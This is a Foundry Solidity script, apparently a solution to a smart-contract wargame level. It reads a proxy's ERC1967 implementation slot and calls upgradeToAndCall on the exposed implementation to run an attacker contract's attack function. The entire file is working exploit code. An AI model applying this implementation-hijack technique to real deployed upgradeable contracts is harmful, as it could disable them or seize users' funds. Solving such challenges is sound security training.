// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Attacker} from "src/Attacker.sol";
import {IEngine} from "src/IEngine.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

contract AttackerScript is Script {

    IEngine target;
    Attacker attacker;

    function setUp() public {
        target = IEngine(0xC6BfA9Ccf5d101E301440526743169B0eA47b287);
    }

    function run() public {
        vm.startBroadcast();

        attacker = new Attacker();
        
        // Engine 컨트랙트 원형 주소 참조
        bytes32 implSlot = vm.load(address(target), ERC1967Utils.IMPLEMENTATION_SLOT);
        target = IEngine(address(uint160(uint256(implSlot))));
        console.logAddress(address(target));

        //target.initialize();
        target.upgradeToAndCall(address(attacker), abi.encodeWithSelector(Attacker.attack.selector));
        console.log(target.horsePower());

        vm.stopBroadcast();
    }
}
